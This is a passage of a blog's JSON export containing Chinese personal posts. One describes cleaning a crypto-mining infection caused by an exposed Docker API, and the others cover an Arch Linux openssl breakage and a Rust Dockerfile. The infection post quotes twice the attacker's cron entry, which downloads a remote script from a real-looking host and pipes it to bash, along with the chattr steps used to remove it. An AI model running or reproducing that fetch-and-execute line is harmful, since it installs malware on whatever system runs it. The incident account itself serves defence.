class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>看样子这就是问题所在了，它会定时下载一个脚本文件并且执行。那么只要把它删掉不就完事大吉了？</p>\n<p>于是我试图用<code>crontab -e</code>删掉它，最后却发现无法编辑这个配置。</p>\n<blockquote>\n<p>“/tmp/crontab.Awo30z” 1L, 1C written<br>crontab: installing new crontab<br>/var/spool/cron/#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted<br>crontab: edits left in /tmp/crontab.Awo30z</p>\n</blockquote>\n<p>病毒怎么可能会让你轻松的删掉这个定时任务？它修改了文件的属性，让它无法被修改——即便你拥有root的最高权限。</p>\n<p>百度后找到了解决方案</p>\n<blockquote>\n<p> 查看是否有特殊的属性 lsattr /var/spool/cron/ </p>\n<p> 去掉特殊的属性 chattr -ai /var/spool/cron/root  &amp;&amp; lsattr /var/spool/cron/root</p>\n</blockquote>\n<p>但是有一点很奇怪，我的腾讯云机器上无法使用chattr指令。他会询问我是否安装一个包，但真安装时却说这个包已经安装过了，不知道这是不是病毒搞得鬼。</p>\n<blockquote>\n<p>[root@VM-16-8-centos lighthouse]# chattr -i /var/spool/cron<br>bash: chattr: command not found…<br>Install package ‘e2fsprogs’ to provide command ‘chattr’? [N/y] y  </p>\n<ul>\n<li>Waiting in queue… Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed</li>\n</ul>\n</blockquote>\n<p>于是我把包给卸载重装了一次，就可以了</p>\n<blockquote>\n<p>yum remove e2fsprogs-1.45.6-2.tl3.x86_64</p>\n</blockquote>\n<p>去除特殊权限后就可以编辑定时任务了。</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"记一次服务器遭到挖矿病毒感染的经历\"><a href=\"#记一次服务器遭到挖矿病毒感染的经历\" class=\"headerlink\" title=\"记一次服务器遭到挖矿病毒感染的经历\"></a>记一次服务器遭到挖矿病毒感染的经历</h1><h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><p>在鼓捣docker，看了一些教程，为了方便一些操作打开了2375端口，导致被人docker注入了。</p>\n<h2 id=\"应对过程\"><a href=\"#应对过程\" class=\"headerlink\" title=\"应对过程\"></a>应对过程</h2><p>其实我之前完全没有面对过服务器遭到病毒攻击的问题…最开始是腾讯云给我发短信，说我的服务器存在危险行为，并且封禁了这台服务器一天。</p>\n<p>当时一上去我就感觉到不对了，服务器上经常莫名奇妙多一个docker镜像，删了也没用。</p>\n<p>后面我使用<code>crontab -l</code>排查了一下定时任务，发现里面有一个奇怪的任务。</p>\n<pre class=\"line-numbers language-sh\" data-language=\"sh\"><code class=\"language-sh\">*&#x2F;30 * * * * &#x2F;usr&#x2F;bin&#x2F;cdz -fsSL http:&#x2F;&#x2F;oracle.zzhreceive.top&#x2F;b2f628&#x2F;b.sh | bash &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>看样子这就是问题所在了，它会定时下载一个脚本文件并且执行。那么只要把它删掉不就完事大吉了？</p>\n<p>于是我试图用<code>crontab -e</code>删掉它，最后却发现无法编辑这个配置。</p>\n<blockquote>\n<p>“&#x2F;tmp&#x2F;crontab.Awo30z” 1L, 1C written<br>crontab: installing new crontab<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;#tmp.VM-16-8-centos.XXXX6iXbXz: Operation not permitted<br>crontab: edits left in &#x2F;tmp&#x2F;crontab.Awo30z</p>\n</blockquote>\n<p>病毒怎么可能会让你轻松的删掉这个定时任务？它修改了文件的属性，让它无法被修改——即便你拥有root的最高权限。</p>\n<p>百度后找到了解决方案</p>\n<blockquote>\n<p> 查看是否有特殊的属性 lsattr &#x2F;var&#x2F;spool&#x2F;cron&#x2F; </p>\n<p> 去掉特殊的属性 chattr -ai &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root  &amp;&amp; lsattr &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>\n</blockquote>\n<p>但是有一点很奇怪，我的腾讯云机器上无法使用chattr指令。他会询问我是否安装一个包，但真安装时却说这个包已经安装过了，不知道这是不是病毒搞得鬼。</p>\n<blockquote>\n<p>[root@VM-16-8-centos lighthouse]# chattr -i &#x2F;var&#x2F;spool&#x2F;cron<br>bash: chattr: command not found…<br>Install package ‘e2fsprogs’ to provide command ‘chattr’? [N&#x2F;y] y  </p>\n<ul>\n<li>Waiting in queue… Failed to install packages: e2fsprogs-1.45.6-2.tl3.x86_64 is already installed</li>\n</ul>\n</blockquote>\n<p>于是我把包给卸载重装了一次，就可以了</p>\n<blockquote>\n<p>yum remove e2fsprogs-1.45.6-2.tl3.x86_64</p>\n</blockquote>\n<p>去除特殊权限后就可以编辑定时任务了。</p>\n"},{"title":"记一次严重滚挂——不要滚动更新openssl","date":"2022-11-22T16:00:00.000Z","author":"寒雨","hide":false,"summary":"算是踩了个大坑吧，电脑差点变成砖没救回来","_content":"\n# 记一次严重滚挂——不要滚动更新openssl\n\n首先从事情的来源说起吧，因为linux上文明6一个更新补丁导致游戏版本回退到远古版本没法跟朋友们联机，哥们准备自寻出路，最后产生了用wine运行windows版本的想法。恰好了解到Steam有一个非常棒的基于wine的开源工具 `proton` 能够兼容绝大部分游戏，于是我满心欢喜的尝试在aur上安装软件包。\n\n![image-20221124005106899](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png)\n\n这是怎么会是呢？我简单看了一下报错信息，看来是依赖冲突了。怎么办呢？于是我脑内产生了一个愚蠢的想法，更新openssl。\n\n~~~bash\nyay -S openssl\n~~~\n\n这一更新可就出大问题了😱，我发现几乎所有的指令都不能使用了（包括 pacman / yay 等管理软件包的指令，甚至还包括sudo）\n\n![图像](https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&name=large)\n\n提示是缺少了动态链接库的依赖\n\n所幸 su 还能用，用 su 进到 root 用户的 bash 里 ldd 看看到底缺少了哪些依赖:\n\n![图像](https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&name=large)\n\n大概就是各种版本的 libssl 和 libcrypto 找不到了，当时真挺绝望的，电脑很多功能都直接用不了了，甚至连文件夹的图像界面也打不开了。\n\n咋办？还能咋办，求救啊\n\n![图像](https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&name=large)\n\n去 telegram 问了一下，大佬发了一个 `pacman-static`，二进制可执行文件版本的pacman，通过它至少能调用pacman了。\n\n大佬估计是嫌麻烦，直接让我 -Syu 。但这样实在太慢，实际上我只需要回滚 openssl 一个包就行了。然后发现 pacman 其实是可以回滚 aur 包的（之前一直以为不能回滚）\n\n![图像](https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&name=large)\n\n~~~bash\n./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst\n~~~\n\n回滚后一切功能恢复正常，有惊无险。","source":"_posts/do-not-scorlling-update-openssl.md","raw":"---\ntitle: 记一次严重滚挂——不要滚动更新openssl\ndate: 2022-11-23\nauthor: 寒雨\nhide: false\nsummary: 算是踩了个大坑吧，电脑差点变成砖没救回来\ncategories: 笔记\ntags:\n  - linux\n  - arch linux\n---\n\n# 记一次严重滚挂——不要滚动更新openssl\n\n首先从事情的来源说起吧，因为linux上文明6一个更新补丁导致游戏版本回退到远古版本没法跟朋友们联机，哥们准备自寻出路，最后产生了用wine运行windows版本的想法。恰好了解到Steam有一个非常棒的基于wine的开源工具 `proton` 能够兼容绝大部分游戏，于是我满心欢喜的尝试在aur上安装软件包。\n\n![image-20221124005106899](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png)\n\n这是怎么会是呢？我简单看了一下报错信息，看来是依赖冲突了。怎么办呢？于是我脑内产生了一个愚蠢的想法，更新openssl。\n\n~~~bash\nyay -S openssl\n~~~\n\n这一更新可就出大问题了😱，我发现几乎所有的指令都不能使用了（包括 pacman / yay 等管理软件包的指令，甚至还包括sudo）\n\n![图像](https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&name=large)\n\n提示是缺少了动态链接库的依赖\n\n所幸 su 还能用，用 su 进到 root 用户的 bash 里 ldd 看看到底缺少了哪些依赖:\n\n![图像](https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&name=large)\n\n大概就是各种版本的 libssl 和 libcrypto 找不到了，当时真挺绝望的，电脑很多功能都直接用不了了，甚至连文件夹的图像界面也打不开了。\n\n咋办？还能咋办，求救啊\n\n![图像](https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&name=large)\n\n去 telegram 问了一下，大佬发了一个 `pacman-static`，二进制可执行文件版本的pacman，通过它至少能调用pacman了。\n\n大佬估计是嫌麻烦，直接让我 -Syu 。但这样实在太慢，实际上我只需要回滚 openssl 一个包就行了。然后发现 pacman 其实是可以回滚 aur 包的（之前一直以为不能回滚）\n\n![图像](https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&name=large)\n\n~~~bash\n./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst\n~~~\n\n回滚后一切功能恢复正常，有惊无险。","slug":"do-not-scorlling-update-openssl","published":1,"updated":"2022-11-24T03:05:46.503Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt7000hsfkl235232wz","content":"<h1 id=\"记一次严重滚挂——不要滚动更新openssl\"><a href=\"#记一次严重滚挂——不要滚动更新openssl\" class=\"headerlink\" title=\"记一次严重滚挂——不要滚动更新openssl\"></a>记一次严重滚挂——不要滚动更新openssl</h1><p>首先从事情的来源说起吧，因为linux上文明6一个更新补丁导致游戏版本回退到远古版本没法跟朋友们联机，哥们准备自寻出路，最后产生了用wine运行windows版本的想法。恰好了解到Steam有一个非常棒的基于wine的开源工具 <code>proton</code> 能够兼容绝大部分游戏，于是我满心欢喜的尝试在aur上安装软件包。</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png\" alt=\"image-20221124005106899\"></p>\n<p>这是怎么会是呢？我简单看了一下报错信息，看来是依赖冲突了。怎么办呢？于是我脑内产生了一个愚蠢的想法，更新openssl。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">yay -S openssl<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这一更新可就出大问题了😱，我发现几乎所有的指令都不能使用了（包括 pacman / yay 等管理软件包的指令，甚至还包括sudo）</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&amp;name=large\" alt=\"图像\"></p>\n<p>提示是缺少了动态链接库的依赖</p>\n<p>所幸 su 还能用，用 su 进到 root 用户的 bash 里 ldd 看看到底缺少了哪些依赖:</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&amp;name=large\" alt=\"图像\"></p>\n<p>大概就是各种版本的 libssl 和 libcrypto 找不到了，当时真挺绝望的，电脑很多功能都直接用不了了，甚至连文件夹的图像界面也打不开了。</p>\n<p>咋办？还能咋办，求救啊</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&amp;name=large\" alt=\"图像\"></p>\n<p>去 telegram 问了一下，大佬发了一个 <code>pacman-static</code>，二进制可执行文件版本的pacman，通过它至少能调用pacman了。</p>\n<p>大佬估计是嫌麻烦，直接让我 -Syu 。但这样实在太慢，实际上我只需要回滚 openssl 一个包就行了。然后发现 pacman 其实是可以回滚 aur 包的（之前一直以为不能回滚）</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&amp;name=large\" alt=\"图像\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>回滚后一切功能恢复正常，有惊无险。</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"记一次严重滚挂——不要滚动更新openssl\"><a href=\"#记一次严重滚挂——不要滚动更新openssl\" class=\"headerlink\" title=\"记一次严重滚挂——不要滚动更新openssl\"></a>记一次严重滚挂——不要滚动更新openssl</h1><p>首先从事情的来源说起吧，因为linux上文明6一个更新补丁导致游戏版本回退到远古版本没法跟朋友们联机，哥们准备自寻出路，最后产生了用wine运行windows版本的想法。恰好了解到Steam有一个非常棒的基于wine的开源工具 <code>proton</code> 能够兼容绝大部分游戏，于是我满心欢喜的尝试在aur上安装软件包。</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bedimage-20221124005106899.png\" alt=\"image-20221124005106899\"></p>\n<p>这是怎么会是呢？我简单看了一下报错信息，看来是依赖冲突了。怎么办呢？于是我脑内产生了一个愚蠢的想法，更新openssl。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">yay -S openssl<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这一更新可就出大问题了😱，我发现几乎所有的指令都不能使用了（包括 pacman &#x2F; yay 等管理软件包的指令，甚至还包括sudo）</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUNNNVEAEn7e_?format=jpg&name=large\" alt=\"图像\"></p>\n<p>提示是缺少了动态链接库的依赖</p>\n<p>所幸 su 还能用，用 su 进到 root 用户的 bash 里 ldd 看看到底缺少了哪些依赖:</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPURVJVIAE99Ou?format=png&name=large\" alt=\"图像\"></p>\n<p>大概就是各种版本的 libssl 和 libcrypto 找不到了，当时真挺绝望的，电脑很多功能都直接用不了了，甚至连文件夹的图像界面也打不开了。</p>\n<p>咋办？还能咋办，求救啊</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUTmIVUAAXLc4?format=jpg&name=large\" alt=\"图像\"></p>\n<p>去 telegram 问了一下，大佬发了一个 <code>pacman-static</code>，二进制可执行文件版本的pacman，通过它至少能调用pacman了。</p>\n<p>大佬估计是嫌麻烦，直接让我 -Syu 。但这样实在太慢，实际上我只需要回滚 openssl 一个包就行了。然后发现 pacman 其实是可以回滚 aur 包的（之前一直以为不能回滚）</p>\n<p><img src=\"https://pbs.twimg.com/media/FiPUdVtVQAEYmXh?format=jpg&name=large\" alt=\"图像\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">./pacman-static -U openssl-1.1-1.1.1s-2-x86_64.pkg.tar.zst<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>回滚后一切功能恢复正常，有惊无险。</p>\n"},{"title":"为Rust写的后端配置docker","date":"2022-05-28T16:00:00.000Z","author":"寒雨","hide":false,"summary":"直到你开始用rust写后端，发现需要在运行平台编译后才能部署，才明白java跨平台的可贵","_content":"\n# 为Rust写的后端配置docker\n\n最近尝试用rust写了一个后端服务，想部署到服务器上。当然是用docker部署，自从接触了docker，我很快便爱上了它~\n\n然后我发现rust的docker配置似乎与java不同..?java只需要把编译出来的jar扔到docker里面，然后直接java -jar便可以运行，但rust似乎需要把整个代码全部copy到docker中在编译环境编译然后才能部署，然而rust的编译又极其消耗性能，导致我第一次部署时直接把服务器给卡崩了。\n\n后来花了50块给服务器升级成了2c4g，再次尝试部署，这次又出现了经典问题\n\n![2022052901](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png)\n\n怎么办呢，当然是给cargo换镜像源咯。\n\n~~~dockerfile\nRUN touch /usr/local/cargo/config.toml\n\n# cargo 上海交大镜像源\nRUN sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;\\\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; \\\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; \\\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; \\\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"\n~~~\n\n这下子就部署成功了\n\n吐槽一下，每次部署都要花大概半个小时，而且cpu占用率能吃到99.75%，编译成功后的镜像大小能达到6个G，实在是不太行。\n\n全部代码\n\n~~~dockerfile\nFROM rust\n\nWORKDIR /usr/src/collection-api\nCOPY . .\n\nRUN touch /usr/local/cargo/config.toml\n\n# cargo 上海交大镜像源\nRUN sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;\\\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; \\\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; \\\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; \\\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"\n\n# Rustup 清华镜像源\nENV RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustup\n\nENV DATABASE_URL *\n\nRUN cargo install --path .\n\nCMD [\"collection-api\"]\n~~~\n\n## 交叉编译\n\n> 在本地编译对应目标系统的产品\n\n如果能用这个的话，那就只需要把产品扔到docker里面，docker源也只需要用最小的airplane了吧。\n\n下次研究。","source":"_posts/docker-configuration-for-rust-server.md","raw":"---\ntitle: 为Rust写的后端配置docker\ndate: 2022-05-29\nauthor: 寒雨\nhide: false\nsummary: 直到你开始用rust写后端，发现需要在运行平台编译后才能部署，才明白java跨平台的可贵\ncategories: 笔记\ntags:\n  - rust\n  - docker\n---\n\n# 为Rust写的后端配置docker\n\n最近尝试用rust写了一个后端服务，想部署到服务器上。当然是用docker部署，自从接触了docker，我很快便爱上了它~\n\n然后我发现rust的docker配置似乎与java不同..?java只需要把编译出来的jar扔到docker里面，然后直接java -jar便可以运行，但rust似乎需要把整个代码全部copy到docker中在编译环境编译然后才能部署，然而rust的编译又极其消耗性能，导致我第一次部署时直接把服务器给卡崩了。\n\n后来花了50块给服务器升级成了2c4g，再次尝试部署，这次又出现了经典问题\n\n![2022052901](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png)\n\n怎么办呢，当然是给cargo换镜像源咯。\n\n~~~dockerfile\nRUN touch /usr/local/cargo/config.toml\n\n# cargo 上海交大镜像源\nRUN sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;\\\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; \\\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; \\\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; \\\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"\n~~~\n\n这下子就部署成功了\n\n吐槽一下，每次部署都要花大概半个小时，而且cpu占用率能吃到99.75%，编译成功后的镜像大小能达到6个G，实在是不太行。\n\n全部代码\n\n~~~dockerfile\nFROM rust\n\nWORKDIR /usr/src/collection-api\nCOPY . .\n\nRUN touch /usr/local/cargo/config.toml\n\n# cargo 上海交大镜像源\nRUN sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;\\\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; \\\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; \\\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; \\\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"\n\n# Rustup 清华镜像源\nENV RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustup\n\nENV DATABASE_URL *\n\nRUN cargo install --path .\n\nCMD [\"collection-api\"]\n~~~\n\n## 交叉编译\n\n> 在本地编译对应目标系统的产品\n\n如果能用这个的话，那就只需要把产品扔到docker里面，docker源也只需要用最小的airplane了吧。\n\n下次研究。","slug":"docker-configuration-for-rust-server","published":1,"updated":"2022-11-24T03:02:53.472Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt9000lsfklbsrlc7vb","content":"<h1 id=\"为Rust写的后端配置docker\"><a href=\"#为Rust写的后端配置docker\" class=\"headerlink\" title=\"为Rust写的后端配置docker\"></a>为Rust写的后端配置docker</h1><p>最近尝试用rust写了一个后端服务，想部署到服务器上。当然是用docker部署，自从接触了docker，我很快便爱上了它~</p>\n<p>然后我发现rust的docker配置似乎与java不同..?java只需要把编译出来的jar扔到docker里面，然后直接java -jar便可以运行，但rust似乎需要把整个代码全部copy到docker中在编译环境编译然后才能部署，然而rust的编译又极其消耗性能，导致我第一次部署时直接把服务器给卡崩了。</p>\n<p>后来花了50块给服务器升级成了2c4g，再次尝试部署，这次又出现了经典问题</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png\" alt=\"2022052901\"></p>\n<p>怎么办呢，当然是给cargo换镜像源咯。</p>\n<pre class=\"line-numbers language-docker\" data-language=\"docker\"><code class=\"language-docker\"><span class=\"token instruction\"><span class=\"token keyword\">RUN</span> touch /usr/local/cargo/config.toml</span>\n\n<span class=\"token comment\"># cargo 上海交大镜像源</span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;<span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这下子就部署成功了</p>\n<p>吐槽一下，每次部署都要花大概半个小时，而且cpu占用率能吃到99.75%，编译成功后的镜像大小能达到6个G，实在是不太行。</p>\n<p>全部代码</p>\n<pre class=\"line-numbers language-docker\" data-language=\"docker\"><code class=\"language-docker\"><span class=\"token instruction\"><span class=\"token keyword\">FROM</span> rust</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">WORKDIR</span> /usr/src/collection-api</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> . .</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> touch /usr/local/cargo/config.toml</span>\n\n<span class=\"token comment\"># cargo 上海交大镜像源</span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;<span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"</span>\n\n<span class=\"token comment\"># Rustup 清华镜像源</span>\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustup</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> DATABASE_URL *</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> cargo install --path .</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">CMD</span> [<span class=\"token string\">\"collection-api\"</span>]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"交叉编译\"><a href=\"#交叉编译\" class=\"headerlink\" title=\"交叉编译\"></a>交叉编译</h2><blockquote>\n<p>在本地编译对应目标系统的产品</p>\n</blockquote>\n<p>如果能用这个的话，那就只需要把产品扔到docker里面，docker源也只需要用最小的airplane了吧。</p>\n<p>下次研究。</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"为Rust写的后端配置docker\"><a href=\"#为Rust写的后端配置docker\" class=\"headerlink\" title=\"为Rust写的后端配置docker\"></a>为Rust写的后端配置docker</h1><p>最近尝试用rust写了一个后端服务，想部署到服务器上。当然是用docker部署，自从接触了docker，我很快便爱上了它~</p>\n<p>然后我发现rust的docker配置似乎与java不同..?java只需要把编译出来的jar扔到docker里面，然后直接java -jar便可以运行，但rust似乎需要把整个代码全部copy到docker中在编译环境编译然后才能部署，然而rust的编译又极其消耗性能，导致我第一次部署时直接把服务器给卡崩了。</p>\n<p>后来花了50块给服务器升级成了2c4g，再次尝试部署，这次又出现了经典问题</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png\" alt=\"2022052901\"></p>\n<p>怎么办呢，当然是给cargo换镜像源咯。</p>\n<pre class=\"line-numbers language-docker\" data-language=\"docker\"><code class=\"language-docker\"><span class=\"token instruction\"><span class=\"token keyword\">RUN</span> touch /usr/local/cargo/config.toml</span>\n\n<span class=\"token comment\"># cargo 上海交大镜像源</span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;<span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这下子就部署成功了</p>\n<p>吐槽一下，每次部署都要花大概半个小时，而且cpu占用率能吃到99.75%，编译成功后的镜像大小能达到6个G，实在是不太行。</p>\n<p>全部代码</p>\n<pre class=\"line-numbers language-docker\" data-language=\"docker\"><code class=\"language-docker\"><span class=\"token instruction\"><span class=\"token keyword\">FROM</span> rust</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">WORKDIR</span> /usr/src/collection-api</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> . .</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> touch /usr/local/cargo/config.toml</span>\n\n<span class=\"token comment\"># cargo 上海交大镜像源</span>\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> sed -e a\\[source.crates-io] /usr/local/cargo/config.toml;<span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://github.com/rust-lang/crates.io-index\\\" /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\replace-with=\\'sjtu\\' /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\[source.sjtu] /usr/local/cargo/config.toml; <span class=\"token operator\">\\</span>\n    sed -e a\\registry=\\\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\\\"</span>\n\n<span class=\"token comment\"># Rustup 清华镜像源</span>\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustup</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">ENV</span> DATABASE_URL *</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> cargo install --path .</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">CMD</span> [<span class=\"token string\">\"collection-api\"</span>]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"交叉编译\"><a href=\"#交叉编译\" class=\"headerlink\" title=\"交叉编译\"></a>交叉编译</h2><blockquote>\n<p>在本地编译对应目标系统的产品</p>\n</blockquote>\n<p>如果能用这个的话，那就只需要把产品扔到docker里面，docker源也只需要用最小的airplane了吧。</p>\n<p>下次研究。</p>\n"},{"title":"Android 